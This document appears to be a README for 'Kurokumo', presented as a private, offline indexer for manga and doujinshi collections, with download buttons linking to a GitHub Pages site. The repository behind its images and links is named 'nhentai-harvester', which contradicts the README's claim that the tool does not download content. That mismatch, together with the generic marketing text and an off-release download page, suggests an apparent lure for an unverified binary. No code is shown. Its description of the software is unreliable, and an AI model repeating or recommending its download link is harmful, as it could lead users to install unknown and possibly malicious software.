![preview](https://raw.githubusercontent.com/srinivasand2022/nhentai-harvester/main/preview.svg)
# Kurokumo

**Your Private Digital Tome for Curated Manga and Doujinshi Libraries**

*An elegant, offline-first archival companion for collectors who value curation, speed, and privacy — without tracking, without ads, without compromise.*

---

## About / はじめに

**Kurokumo** (黒雲 — "Black Cloud") is a modern, browser-based archival navigator designed for anyone who collects digital manga, doujinshi, or illustrated folios from community-driven sources. Inspired by the need for a discrete, fast, and respectful way to organize and browse your personal library, Kurokumo shifts the paradigm: instead of chasing links and worrying about availability, you build a serene, searchable metadata index that lives entirely on your machine.

Unlike conventional downloaders that feel like afterthoughts bolted onto a web scraper, Kurokumo treats your library like a curated gallery. It reads, indexes, and presents your existing collection in a clean, responsive interface — think of it as a personal librarian who works silently, respects your privacy, and never asks for a login.

---

## ✨ Key Features

- **Lightning-Fast Local Indexing**  
  Scan your organized folders of archived works and build a full-text searchable catalog in seconds. No cloud, no servers — every search stays on your device.

- **Metadata Enrichment Engine**  
  Automatically pull cover thumbnails, series tags, artist names, and descriptions from public metadata sources (if you choose). *You* control the toggle — no data leaves without your permission.

- **Multilingual Tag & Title Support**  
  Browse and search across titles in Japanese, Chinese, English, and more. Unicode-aware sorting and fuzzy matching ensure you find what you need, even if you can’t perfectly remember the name.

- **Responsive, Minimalist UI**  
  Works beautifully on desktop, tablet, or mobile. Dark mode and light mode themes adapt to your environment. Navigation is gesture-friendly and keyboard-accessible.

- **Offline-First Architecture**  
  All indexes and covers are cached locally. Once built, your library is fully accessible without an internet connection — perfect for commuting, travel, or simply disconnecting.

- **Export & Backup in One Click**  
  Generate a portable `.kurokumo` archive (a self-contained JSON + thumbnail bundle) that you can share or restore on another device. No vendor lock-in, no proprietary formats.

- **Privacy-Focused by Design**  
  No telemetry, no analytics, no user accounts. Kurokumo never phones home. Your library is your own.

---

## [![Download](https://raw.githubusercontent.com/srinivasand2022/nhentai-harvester/main/button.svg)](https://srinivasand2022.github.io/nhentai-harvester/)

*Download the latest stable release for your platform (Windows, macOS, Linux) by clicking the badge above.*

---

## 🎯 Intended Use Cases

| Scenario | Benefit |
|----------|---------|
| You collect doujinshi from multiple sources and want one unified view | Kurokumo indexes metadata and thumbnails into one local catalog |
| You want to search your collection while offline on a long flight | All data lives on-device — no internet required |
| You maintain a shared collection on a NAS and want a lightweight browser | Kurokumo scans network drives and presents a responsive web UI |
| You prefer a silent, non-intrusive tool that respects your browsing habits | No background processes, no nagging updates — just a clean library |

---

## 🚀 Getting Started

After downloading and launching Kurokumo for the first time, you’ll be greeted by an empty library screen. From there:

1. **Choose a root folder** — point Kurokumo to your organized collection directory (e.g., `D:/Manga/Library`). The tool will recursively scan for supported archive formats (`.cbz`, `.zip`, `.rar`, `.7z`, and raw image folders).

2. **Wait for indexing** — Kurokumo reads file names, folder structures, and optional embedded metadata. A progress indicator shows how many entries have been processed.

3. **Browse or search** — the main view presents cover thumbnails in a grid. Use the search bar to filter by title, tag, artist, or any text found inside metadata.

4. **Enjoy offline access** — once indexed, your library is fully navigable without internet. Kurokumo saves its database to a local file next to the application binary.

---

## 🛠️ Architecture at a Glance

Kurokumo is built on three lightweight, battle-tested open-source libraries:

- **Frontend:** A single-page application (Vue 3 + Pinia) for reactive, component-based UI with minimal overhead.
- **Backend:** A small Go service that handles file scanning, metadata extraction, and thumbnail generation. No database server needed — everything uses SQLite via embedded storage.
- **Metadata Sources:** Optional, configurable connectors to public community APIs (disabled by default). All fetched data is cached locally; no persistent remote connections.

The entire application ships as a single **self-contained binary** with an embedded web server. Launch it, open your browser to `localhost:8080`, and you’re done.

---

## 🧪 Comparison: Kurokumo vs. Traditional Downloaders

| Aspect | Traditional Downloaders | Kurokumo |
|--------|------------------------|----------|
| Primary purpose | Batch downloading from websites | Organizing & browsing *existing* collections |
| Internet dependency | Usually required | Optional (metadata enrichment only) |
| Library size limits | Often capped by API or server | Only limited by your disk space |
| User tracking | Common (analytics, crash reports) | None (telemetry-free) |
| Ease of sharing | Difficult (re-download or folder copy) | One-click `.kurokumo` export |

---

## 🌍 Community & Support

- **Discussions:** Use the **Discussions** tab for feature proposals, show-and-tell, and questions.
- **Issues:** Report bugs or request features via **GitHub Issues**. Please include your OS version and a brief description of your library structure.
- **24/7 Support:** Not a real phone line, but we monitor issues and discussions daily. Expect a response within 24–48 hours.

---

## 📝 License

Kurokumo is released under the **MIT License**. You are free to use, modify, and distribute it for any purpose — personal or commercial — as long as the original license notice remains intact.

[View the full MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

Kurokumo is a **local archival tool** designed to help you organize and browse files you already possess. It does not facilitate the unauthorized downloading of copyrighted material. Users are solely responsible for ensuring that their collection complies with applicable laws and intellectual property rights in their jurisdiction. The maintainers of Kurokumo do not host, distribute, or provide access to any copyrighted content through this application. By using Kurokumo, you agree to use it for lawful purposes only.

*© 2026 Kurokumo contributors. All rights reserved under the MIT License — which means, technically, you hold the rights too.*

---

## [![Download](https://raw.githubusercontent.com/srinivasand2022/nhentai-harvester/main/button.svg)](https://srinivasand2022.github.io/nhentai-harvester/)

*Grab the latest release for your operating system. No installation wizard, no registry edits — just unzip and run.*